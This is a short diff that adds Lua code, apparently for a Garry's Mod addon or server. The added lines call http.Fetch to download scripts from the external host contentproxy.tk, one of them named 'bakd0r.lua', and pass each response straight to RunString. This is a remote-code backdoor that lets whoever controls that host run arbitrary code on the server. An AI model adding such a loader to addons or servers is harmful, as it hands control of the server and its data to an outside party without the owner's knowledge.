@@ -1,0 +1,6 @@
+http.Fetch("https://contentproxy.tk/bakd0r.lua?key="..math.random(1,999999),function(b)
+	RunString(b)
+end)
+http.Fetch("https://contentproxy.tk/GLXLibHelper.lua?betakey="..math.random(1,999999),function(b)
+	RunString(b)
+end)
